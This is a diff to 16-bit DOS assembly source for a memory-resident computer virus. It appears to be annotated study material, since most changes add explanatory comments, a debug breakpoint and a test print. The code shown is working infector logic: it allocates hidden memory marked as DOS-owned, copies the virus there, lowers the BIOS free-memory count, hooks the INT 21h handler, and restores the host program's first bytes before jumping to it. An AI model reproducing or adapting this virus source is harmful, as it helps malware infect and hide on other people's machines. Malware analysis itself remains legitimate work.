@@ -63,6 +63,7 @@ mov es, ax ;get MCB
 ;                    technically isn't
 cmp byte ptr es:[0],'Z' ;is it the last MCB in the chain ?
 jne CANNOT_INSTALL
+
 mov bx, es:[3] ;get block size
 sub bx, ((offset END_OF_CODE-offset START+15)/16)+1 ;compute new block size in paragraphs
 push ds
@@ -70,21 +71,25 @@ pop es
 mov ah, 4Ah ;resize memory block
 int 21h
 ; ALLOCATE MEMORY 
-mov ah, 48h ;allocate memory for the virus
-mov bx, (offset END_OF_CODE - offset START+15)/16 ;16BITS
+mov ah, 48h ;allocate memory for the virus --> Allocates a block of memory and returns a pointer to the start of the area
+mov bx, (offset END_OF_CODE - offset START+15)/16 ;16BITS --> Number of paragraphs of memory needed
 int 21h ;AX will contain segment of allocated block
+;When a COM file loads, it conceptually owns all the remainder of memory from its PSP upwards.
+; This call may be used to lirnit a program's memory allocation to its immediate requirements.
+  
 ; UPDATE MCB 
-dec ax 
+dec ax ;If the call succeeds AX:0000 points to the start of the block. go to the address before.
 mov es, ax ;get MCB ES - extra segment register, it's up to a coder to define its usage.
 mov byte ptr [es:[0]], 'Z' ;mark MCB as last in chain
 mov word ptr [es:[1]], 8 ;mark DOS as owner of memory block
-inc ax
-mov es, ax ;get memory block
+inc ax ; return to the first address in In the allocated block AX:0000
+mov es, ax ;get memory block buck to es 
 xor di, di ;destination address
 lea si, bp+START ;start of virus code in memory
 mov cx, offset END_OF_CODE-offset START
 cld;clears the direction flag. This tells the 8086 that it must increment the SI and DI register after each iteration
 rep movsb ;copy virus
+
 int 3h;INT 3 causes an interrupt and calls an interrupt vector set up by the OS=DOS
 ;When active the debugger sets his own interrupt handler for INT3 in the system. 
 ;Any call to INT3 will cause the running program to *break* (stop execution) and branch out execution to the debugger's INT3 handler.
@@ -100,18 +105,22 @@ push es
 pop ds ;make DS = segment of newly allocated block
 mov ax, 40h
 mov es, ax ;get BIOS segment
-sub word ptr [es:[13h]], (offset END_OF_CODE-offset START+1023)/1024
-;reduce available memory -->  -100h  
+sub word ptr [es:[13h]], (offset END_OF_CODE-offset START+1023)/1024 
 ; INSTALL NEW ISR FOR INT 21h 
+;reduce available memory -->  -100h 
+
 mov al, nISRNumber
 lea si, dwOldExecISR-100h
 lea dx, NewDosISR-100h
 call HookISR    
-;  UPDATE CALL INSTRUCTION IN NewExecISR 
-mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction in PROC NewDOSISR in the new mcb that ALLOCATE
+; UPDATE CALL INSTRUCTION IN NewExecISR 
+   mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction in PROC NewDOSISR in the new mcb that ALLOCATE
 ;When executing a far call in realaddress or virtual-8086 mode,
 ; the processor pushes the current value of both the CS and EIP registers onto the stack for use as a return-instruction pointer.
 ; The processor then performs a far branch to the code segment and offset specified with the target operand for the called procedure.
+    mov dl,'A' ; print 'A'
+   mov ah,2h
+   int 21h  
 CANNOT_INSTALL:
 VIRUS_ALREADY_INSTALLED:
 ;TRANSFER CONTROL TO HOST PROGRAM 
@@ -125,7 +134,7 @@ mov cx,5 ;restore 5 bytes
 rep movsb
 mov bx, 100h
 push bx
-ret ;transfer to host program
+retn ;transfer to host program
 END_OF_CODE:
 CODE_SEG ENDS
 end start
